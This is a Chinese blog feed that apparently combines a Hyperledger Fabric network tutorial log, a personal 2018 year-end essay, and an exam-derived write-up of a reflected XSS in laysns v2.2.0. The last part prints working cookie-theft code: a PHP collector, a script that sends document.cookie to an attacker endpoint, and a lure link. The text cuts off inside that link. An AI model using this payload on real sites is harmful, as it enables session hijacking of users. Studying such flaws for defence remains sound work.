class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">Creating network &quot;net_byfn&quot; with the default driver</span><br><span class="line">Creating volume &quot;net_peer0.org2.example.com&quot; with default driver</span><br><span class="line">Creating volume &quot;net_peer1.org2.example.com&quot; with default driver</span><br><span class="line">Creating volume &quot;net_peer1.org1.example.com&quot; with default driver</span><br><span class="line">Creating volume &quot;net_peer0.org1.example.com&quot; with default driver</span><br><span class="line">Creating volume &quot;net_orderer.example.com&quot; with default driver</span><br><span class="line">Creating peer1.org2.example.com ... done</span><br><span class="line">Creating peer0.org2.example.com ... done</span><br><span class="line">Creating peer1.org1.example.com ... done</span><br><span class="line">Creating peer0.org1.example.com ... done</span><br><span class="line">Creating orderer.example.com    ... done</span><br><span class="line">Creating cli                    ... done</span><br><span class="line"></span><br><span class="line"> ____    _____      _      ____    _____ </span><br><span class="line">/ ___|  |_   _|    / \    |  _ \  |_   _|</span><br><span class="line">\___ \    | |     / _ \   | |_) |   | |  </span><br><span class="line"> ___) |   | |    / ___ \  |  _ &lt;    | |  </span><br><span class="line">|____/    |_|   /_/   \_\ |_| \_\   |_|  </span><br><span class="line"></span><br><span class="line">Build your first network (BYFN) end-to-end test</span><br><span class="line"></span><br><span class="line">+ peer channel create -o orderer.example.com:7050 -c mytest1 -f ./channel-artifacts/channel.tx --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem</span><br><span class="line">Channel name : mytest1</span><br><span class="line">Creating channel...</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:35.602 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:35.801 UTC [cli.common] readBlock -&gt; INFO 002 Received block: 0</span><br><span class="line">===================== Channel &apos;mytest1&apos; created ===================== </span><br><span class="line"></span><br><span class="line">Having all peers join the channel...</span><br><span class="line">+ peer channel join -b mytest1.block</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:36.041 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:36.177 UTC [channelCmd] executeJoin -&gt; INFO 002 Successfully submitted proposal to join channel</span><br><span class="line">===================== peer0.org1 joined channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">+ peer channel join -b mytest1.block</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:39.396 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:39.473 UTC [channelCmd] executeJoin -&gt; INFO 002 Successfully submitted proposal to join channel</span><br><span class="line">===================== peer1.org1 joined channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">+ peer channel join -b mytest1.block</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:42.656 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:42.729 UTC [channelCmd] executeJoin -&gt; INFO 002 Successfully submitted proposal to join channel</span><br><span class="line">===================== peer0.org2 joined channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">+ peer channel join -b mytest1.block</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:45.890 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:45.990 UTC [channelCmd] executeJoin -&gt; INFO 002 Successfully submitted proposal to join channel</span><br><span class="line">===================== peer1.org2 joined channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">Updating anchor peers for org1...</span><br><span class="line">+ peer channel update -o orderer.example.com:7050 -c mytest1 -f ./channel-artifacts/Org1MSPanchors.tx --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:49.159 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:49.208 UTC [channelCmd] update -&gt; INFO 002 Successfully submitted channel update</span><br><span class="line">===================== Anchor peers updated for org &apos;Org1MSP&apos; on channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">Updating anchor peers for org2...</span><br><span class="line">+ peer channel update -o orderer.example.com:7050 -c mytest1 -f ./channel-artifacts/Org2MSPanchors.tx --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:52.409 UTC [channelCmd] InitCmdFactory -&gt; INFO 001 Endorser and orderer connections initialized</span><br><span class="line">2019-03-13 09:03:52.441 UTC [channelCmd] update -&gt; INFO 002 Successfully submitted channel update</span><br><span class="line">===================== Anchor peers updated for org &apos;Org2MSP&apos; on channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">Installing chaincode on peer0.org1...</span><br><span class="line">+ peer chaincode install -n mycc -v 1.0 -l golang -p github.com/chaincode/chaincode_example02/go/</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:55.668 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 001 Using default escc</span><br><span class="line">2019-03-13 09:03:55.668 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 002 Using default vscc</span><br><span class="line">2019-03-13 09:03:58.029 UTC [chaincodeCmd] install -&gt; INFO 003 Installed remotely response:&lt;status:200 payload:&quot;OK&quot; &gt; </span><br><span class="line">===================== Chaincode is installed on peer0.org1 ===================== </span><br><span class="line"></span><br><span class="line">Install chaincode on peer0.org2...</span><br><span class="line">+ peer chaincode install -n mycc -v 1.0 -l golang -p github.com/chaincode/chaincode_example02/go/</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:58.241 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 001 Using default escc</span><br><span class="line">2019-03-13 09:03:58.241 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 002 Using default vscc</span><br><span class="line">2019-03-13 09:03:58.597 UTC [chaincodeCmd] install -&gt; INFO 003 Installed remotely response:&lt;status:200 payload:&quot;OK&quot; &gt; </span><br><span class="line">===================== Chaincode is installed on peer0.org2 ===================== </span><br><span class="line"></span><br><span class="line">Instantiating chaincode on peer0.org2...</span><br><span class="line">+ peer chaincode instantiate -o orderer.example.com:7050 --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem -C mytest1 -n mycc -l golang -v 1.0 -c &apos;&#123;&quot;Args&quot;:[&quot;init&quot;,&quot;a&quot;,&quot;100&quot;,&quot;b&quot;,&quot;200&quot;]&#125;&apos; -P &apos;AND (&apos;\&apos;&apos;Org1MSP.peer&apos;\&apos;&apos;,&apos;\&apos;&apos;Org2MSP.peer&apos;\&apos;&apos;)&apos;</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:03:58.812 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 001 Using default escc</span><br><span class="line">2019-03-13 09:03:58.812 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 002 Using default vscc</span><br><span class="line">===================== Chaincode is instantiated on peer0.org2 on channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">Querying chaincode on peer0.org1...</span><br><span class="line">===================== Querying on peer0.org1 on channel &apos;mytest1&apos;... ===================== </span><br><span class="line">Attempting to Query peer0.org1 ...3 secs</span><br><span class="line">+ peer chaincode query -C mytest1 -n mycc -c &apos;&#123;&quot;Args&quot;:[&quot;query&quot;,&quot;a&quot;]&#125;&apos;</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line"></span><br><span class="line">100</span><br><span class="line">===================== Query successful on peer0.org1 on channel &apos;mytest1&apos; ===================== </span><br><span class="line">Sending invoke transaction on peer0.org1 peer0.org2...</span><br><span class="line">+ peer chaincode invoke -o orderer.example.com:7050 --tls true --cafile /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/ordererOrganizations/example.com/orderers/orderer.example.com/msp/tlscacerts/tlsca.example.com-cert.pem -C mytest1 -n mycc --peerAddresses peer0.org1.example.com:7051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt --peerAddresses peer0.org2.example.com:9051 --tlsRootCertFiles /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/tls/ca.crt -c &apos;&#123;&quot;Args&quot;:[&quot;invoke&quot;,&quot;a&quot;,&quot;b&quot;,&quot;10&quot;]&#125;&apos;</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:06:36.914 UTC [chaincodeCmd] chaincodeInvokeOrQuery -&gt; INFO 001 Chaincode invoke successful. result: status:200 </span><br><span class="line">===================== Invoke transaction successful on peer0.org1 peer0.org2 on channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">Installing chaincode on peer1.org2...</span><br><span class="line">+ peer chaincode install -n mycc -v 1.0 -l golang -p github.com/chaincode/chaincode_example02/go/</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line">2019-03-13 09:06:37.117 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 001 Using default escc</span><br><span class="line">2019-03-13 09:06:37.117 UTC [chaincodeCmd] checkChaincodeCmdParams -&gt; INFO 002 Using default vscc</span><br><span class="line">2019-03-13 09:06:37.506 UTC [chaincodeCmd] install -&gt; INFO 003 Installed remotely response:&lt;status:200 payload:&quot;OK&quot; &gt; </span><br><span class="line">===================== Chaincode is installed on peer1.org2 ===================== </span><br><span class="line"></span><br><span class="line">Querying chaincode on peer1.org2...</span><br><span class="line">===================== Querying on peer1.org2 on channel &apos;mytest1&apos;... ===================== </span><br><span class="line">Attempting to Query peer1.org2 ...3 secs</span><br><span class="line">+ peer chaincode query -C mytest1 -n mycc -c &apos;&#123;&quot;Args&quot;:[&quot;query&quot;,&quot;a&quot;]&#125;&apos;</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line"></span><br><span class="line">90</span><br><span class="line">===================== Query successful on peer1.org2 on channel &apos;mytest1&apos; ===================== </span><br><span class="line"></span><br><span class="line">========= All GOOD, BYFN execution completed =========== </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> _____   _   _   ____   </span><br><span class="line">| ____| | \ | | |  _ \  </span><br><span class="line">|  _|   |  \| | | | | | </span><br><span class="line">| |___  | |\  | | |_| | </span><br><span class="line">|_____| |_| \_| |____/</span><br></pre></td></tr></table></figure><h4 id="4、关闭网络"><a href="#4、关闭网络" class="headerlink" title="4、关闭网络"></a>4、关闭网络</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./byfn.sh -m up -c mytest1</span><br></pre></td></tr></table></figure><p>成功后显示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Stopping cli                    ... done</span><br><span class="line">Stopping peer0.org1.example.com ... done</span><br><span class="line">Stopping orderer.example.com    ... done</span><br><span class="line">Stopping peer0.org2.example.com ... done</span><br><span class="line">Stopping peer1.org1.example.com ... done</span><br><span class="line">Stopping peer1.org2.example.com ... done</span><br><span class="line">Removing cli                    ... done</span><br><span class="line">Removing peer0.org1.example.com ... done</span><br><span class="line">Removing orderer.example.com    ... done</span><br><span class="line">Removing peer0.org2.example.com ... done</span><br><span class="line">Removing peer1.org1.example.com ... done</span><br><span class="line">Removing peer1.org2.example.com ... done</span><br><span class="line">Removing network net_byfn</span><br><span class="line">Removing volume net_peer0.org3.example.com</span><br><span class="line">WARNING: Volume net_peer0.org3.example.com not found.</span><br><span class="line">Removing volume net_peer1.org3.example.com</span><br><span class="line">WARNING: Volume net_peer1.org3.example.com not found.</span><br><span class="line">Removing volume net_orderer.example.com</span><br><span class="line">Removing volume net_peer0.org2.example.com</span><br><span class="line">Removing volume net_peer0.org1.example.com</span><br><span class="line">Removing volume net_peer1.org1.example.com</span><br><span class="line">Removing volume net_peer1.org2.example.com</span><br><span class="line">bf5553092b5a</span><br><span class="line">0198acc0e83e</span><br><span class="line">5c0dad0e5b89</span><br><span class="line">Untagged: dev-peer1.org2.example.com-mycc-1.0-26c2ef32838554aac4f7ad6f100aca865e87959c9a126e86d764c8d01f8346ab:latest</span><br><span class="line">Deleted: sha256:b550da58d9213e0d82d7f362212eb84f8bffa0d7751cdfcbaf3258ef75c3f24a</span><br><span class="line">Deleted: sha256:d7dced24e5ba3373a3c3bd736be0a351481a21df9209503a3fa93635e4aa7f46</span><br><span class="line">Deleted: sha256:36739293e8852c3feb37dd3e08eb20f3004494d8eec3cba05c134454178323b1</span><br><span class="line">Deleted: sha256:7190f5476edd042aa64c39fcf7909f194bdc10e85e02ee1cecf21add3756d8a1</span><br><span class="line">Untagged: dev-peer0.org1.example.com-mycc-1.0-384f11f484b9302df90b453200cfb25174305fce8f53f4e94d45ee3b6cab0ce9:latest</span><br><span class="line">Deleted: sha256:4db24b70e9fbd10b3b20b6255011d45ac7fb92a7ee9731b7f8cc6e681e1a0eb6</span><br><span class="line">Deleted: sha256:38880d76d92c07ca6477ab3a899d21f00f76801f05b4adb3aba58d5bcf224bde</span><br><span class="line">Deleted: sha256:23a054642ba1b7f84991df2611f22b2a0894ea81676ecc9bc124f50832d04f12</span><br><span class="line">Deleted: sha256:f1811e1e4784e9e4537e98ba4a1bb86e56ee070ea443a026dc61c1375d6f8c30</span><br><span class="line">Untagged: dev-peer0.org2.example.com-mycc-1.0-15b571b3ce849066b7ec74497da3b27e54e0df1345daff3951b94245ce09c42b:latest</span><br><span class="line">Deleted: sha256:0c1d56951ae35a8d9db90dc3decda420ca2cf0fcbaa8ccbc4aa580de9fdd58f0</span><br><span class="line">Deleted: sha256:4ccfcafb3212b0448c0a106f25f91c59c56d709fd374658d814ba853bc315991</span><br><span class="line">Deleted: sha256:51b7b0c6e633a94040cb799596a52a13480b3b90819594d5f5c5f17b1ecdc632</span><br><span class="line">Deleted: sha256:11473124d5b1ddfe7136f913791002059bbe8d466e2a931a87caf50e6166996f</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 区块链学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blockchain </tag>
            
            <tag> hyperledger </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018</title>
      <link href="/2018/12/31/2018/"/>
      <url>/2018/12/31/2018/</url>
      
        <content type="html"><![CDATA[<p>今天是2018年最后一天，也没多大感慨，只是闲得慌，随便瞎扯两句。我这人没有什么规划和目标，主要还是前方一片迷茫，没有具体的方向，所以2018所发生的事情大多是我没有预料到的。就像我现在一样，对2019并没有什么特别的期待。计划总是赶不上变化，遇见未知的自己又何尝不好呢？</p><p>我的2018还要从去年学校跨年晚会的那一刻说起，那是和轮滑社的朋友一起跨年，第一次体验学校的跨年晚会，和几个老朋友互道了新年快乐，然后就睡了。接下来的日子一如往昔，并没有什么特别的惊喜。</p><p>元旦到了基本就是要迎接期末考试了，于是大二上结束了，从后面的结果来看，我的考试还算顺利。我又在学校多呆了十天，主要是考科三。一切都很顺利，科三一遍过。后来暑假考了科四，2018，我拿到了驾驶证，从此再也不用担心无证驾驶被抓了。</p><p>回家之前，老爸突然说要给我买个单反。之前老爸就跟我说过，如果我大学拿到了奖学金就给我买单反。我差不多都快忘了这事，这是老爸又提起，他说：“早买早享受“。我觉得挺有道理，很多时候我们做某件事情都喜欢等，等最合适的时间，这样往往就错过了。于是，我有了自己的单反。我其实很早之前就想拥有一款单反，我喜欢照片最本真的样子。然后第二天就去了趟鼓浪屿，想去给相机开开光。那天下起“了小雨，虽然光源不太充足，但是也别有一般趣味。”群芳不厌寒中开，只为翘首盼君来。今日料知君将近，忙引甘露惹尘埃。“我写下了这首小诗来表达心中的喜悦。有人说，眼睛是天然的照相机。这句话不假。我觉得能拍出好的照片的有两种人，一种是学会创造美的人人，一种是发现美的人。想要拍出好的照片，首先眼睛里要有美的存在。眼睛用来发现美，相机用来定格美，如此，生活便美不胜收。</p><p>过年自然是要回家的。还是如往年一年，过年并没有多大的趣味，见几个老友，吹几场牛逼。但是2018不一样，没有趣味，但有感伤。姐姐出嫁了。我清楚的记得那天，上午还是热热闹闹的，等婚车把姐姐接走后，屋里边空荡荡的。老妈倚在门口，对我说：“家里突然少了个人还真有点不习惯”。我那天说了很少的话，姐姐被接走后，我点起了一根烟，发现尼古丁和焦油并没有大家说的那么神奇。后来喝了点啤酒，我其实是不抽烟也不喝酒的。然后头昏昏沉沉的就睡过去了。醒来发现还是空荡荡的。“人生几次此阵容，锣敲鼓捶，似烈马惊鸿。楼上郎妾秋波送，席间宾客欢声浓。 谁知喜事皆倥偬，苦烟浊酒，无济心事重。误以醉梦可消茕，醒来仍旧一场空。”只好填此《蝶恋花》聊以慰藉。</p><p>开学了，刚开始还是很舒服的，周末爬山去植物园，写了一篇小记：</p><p>”寒冬已逝，暖春悄至。恰近日，有灰云盗日，和风藏雨。遂携二三友，作爬山寻木之行。 久居室中，竟不知草木之涩，树花之美。每行两步，便惊于木叶之奇妆，叹于山间之空旷。渐行之，花欲盛，红似深宫娇娘起舞，紫如江湖侠女弄剑；树欲茂，青似少年驭马之英豪，墨如老僧念经之沉稳。至山顶，忽闻松涛阵阵，鸟声潺潺，心窃喜，此景山上有，山下哪得闻？ 置身于山中，唯愿闻之声可入耳，欲观之景可及目。故所闻所见，皆好声好色。叹之，无人之处，花开极盛！遂归记之。“</p><p>去了一次鼓浪屿拍建筑，清明去了东山岛。东山岛的海确实比厦门的好看，碧绿的海，还有贝壳可以捡。后来就渐渐进入了梦魇时期，盼望着这学期早点结束。</p><p>可能是对厦门的早餐过于失望，也可能是觉得好玩。我买了锅和油盐，然后早上就自己捣鼓早餐。有火腿、牛奶、鸡蛋、面包、水果等。体验了一把精致的生活，主要还是太麻烦，也可能是太懒，一个月之后，全部偃旗息鼓了。所以我决定，以后找个媳妇，首先教她做早餐，然后让她每天做给我吃哈哈哈。</p><p>期间过了一次生日，刚好20岁。还记得那天晚上，我在球场打球，没有任何准备。这是，体育部的一群人就冲上来了，他们手里都拿着不同的水果，水果上面写着祝福语。后来我们去了老张吃烧烤，他们还准备了蛋糕，上面写着“心之所向，身之所往”。那天确实很感动，已经很久没有什么能够打动我了。</p><p>5月11号，我去福州参加了信息安全铁人三项赛。那是我大学时期第一次参加比赛，那时的我真的是菜的抠脚，虽然现在是菜的抠手。但那次比赛之后，我有参加许多网络空间安全的比赛，渐渐的锻炼了自己，学到了不少东西，也获得不少奖项。我大学最终的方向也从此确定—-网络安全。直白点，就是黑客。这是一个漫长且有意思的事，我渐渐宅了起来，学习各种知识以及技术，希望某一天，你们懂得。。。</p><p>我有点乏了，有点写不下去了，感觉2018发生了好多事，记忆在不断交错重叠。</p><p>七月，暑假到了。我尝试留起了中分，拍了一组照片。后来姐姐生了，这意味着一个伟大的舅舅诞生了。小学期学了数据恢复，我在一张被格式化的内存卡里面会付出了300多张初中的照片。又再一次看到了青涩的自己，发现自己青涩如初。</p><p>哦，对了。2018，我听了一场GIN的演奏会，吉他上也有他的签名。我也看了一场五月天的演唱会，都是很不错的体验。</p><p>去了次婺源，徽派建筑确实像泼墨山水画。虽然没看到漫山遍野的花，但是晚秋之景也足以让人流连忘返。</p><p>后来开学了，开学之后就很少参加活动了，也很少出去玩。就感觉一直在不停的打比赛。然后就不停的拿奖哈哈，虽然奖项不高。</p><p>说起拿奖，我今年好像还拿了挺多奖的。填学年鉴定的时候，发现了一堆证书。室友看见了，说：“你怎么那么多证书？”我说：“我也不知道哪来这么多鬼东西”。然后我们就哈哈大笑。所有奖项里面最有含金量的当然是国奖，毕竟价值8000。有时候我也很奇怪，我没想过要拿国奖。在填写申请表的时候我才想到，何不试试呢?可能有运气加成，我知道自己几斤几两。</p><p>开学之前立了个flag，这学期尽量不迟到。然后，flag没倒，但是歪了。我差不多把要迟到的课都翘了，我这学期翘的课比我前20年翘的课加起来还多。翘课真的是会上瘾，人总是有侥幸心理。某次翘课没被抓，后面就会越翘越多。新年有个愿望，下学期就不翘课了。</p><p>我大概翘了一个学期的马原，因为它妨碍我搞钱了。说起搞钱，我现在不想读书不想恋爱只想搞钱。这学期除了拿奖学金，打比赛拿奖金之外，我还找了份兼职。我也不知道自己为什么会去找兼职，可能是暑假的时候玩多了太穷了吧，我还记得当时穷到把小黄的押金都退了。兼职是在一个托管班辅导小学生写作业，小学生都挺可爱的，满眼都是十多年前的自己。</p><p>还有什么呢？我记不起来了。哦，对，我买了vps，以后可以随心所欲的上外网了，我也可以“推特治国”了。2018吧，其实我觉得也不算快吧，发生了挺多事，遇见了不一样的自己。2019又会发生什么呢？谁知道呢？</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> essay </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>xss_laysns</title>
      <link href="/2018/12/26/xss_laysns/"/>
      <url>/2018/12/26/xss_laysns/</url>
      
        <content type="html"><![CDATA[<p>0x00前言</p><p>这其实是电子数据取证的期末考试案例，考的是云服务器取证。看着很像有xss漏洞的样子，抱着试一试的心态测试了一下，哈哈还真有。后来上网查了一下，好像是被曝出有前台xss漏洞的laysns v2.2.0。不管了，修复是不可能去修复了，有漏洞我就先攻击一波再说。</p><p>0x01漏洞检测</p><p>看到搜索框，心中就燃起了炽烈的求知欲。前段时间有个大佬教了我一段JS代码，一直不明白什么意思，不如搜一搜。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>输入以上代码，就在按下回车的那一刻，突然弹出下面这么一个东西，下了我一跳。</p><p><img alt="" data-src="/2018/12/26/xss_laysns/1.png" class="lazyload"></p><p>好了，果然存在反射型xss，开始攻击。</p><p>0x02跨站脚本攻击</p><p>在攻击之前，一直不明白，为什么这种漏洞叫Cross-site Script。一般测试都只是Script attack，并没有Cross-site。但实际攻击中的JS恶意代码肯定是在攻击者的站点下面。那么，实施什么攻击好呢？盗取cookie吧，简单又惬意。好了，不说废话了，上脚本。</p><p>首先在攻击站点创建cookie.txt用来接收cookie，创建hack.php作为手机cookie的接口，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">    $cookie = $_GET[<span class="string">'q'</span>]; </span><br><span class="line"></span><br><span class="line">    var_dump($cookie); </span><br><span class="line"></span><br><span class="line">    $myFile = <span class="string">"cookie.txt"</span>; </span><br><span class="line"></span><br><span class="line">    file_put_contents($myFile, $cookie); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>接着创建JS脚本hack.js，代码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line"></span><br><span class="line">img.src = <span class="string">"http://localhost/hack/hack.php?q="</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.body.append(img);</span><br></pre></td></tr></table></figure><p>最后创建一个HTML页面来诱导用户hack.html,代码如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://localhost/sns/search.html?ks=%3Cscript+</span></span></span><br><span class="line"><span class="tag"><span class="string"></span></span></span><br><span class="line"><span class="tag"><span class="string">src%3Dhttp%3A%2F%2Flocalhost%2Fhack%2Fhack.js%3E%3C%2Fscript%3E&amp;commend=</span></span></span><br><span class="line"><span class="tag"><span class="string"></span></span></span><br><span class="line"><span class="tag"><span class="string">all&amp;ssid=s5-e&amp;search_type=item&amp;atype=&amp;filterFineness=&amp;rr=</span></span></span><br><span class="line"><span class="tag"><span class="string"></span></span></span><br><span class="line"><span class="tag"><span class="string">1&amp;pcat=food2011&amp;style=grid&amp;cat="</span>&gt;</span>click me<span class="tag">&lt;/<span 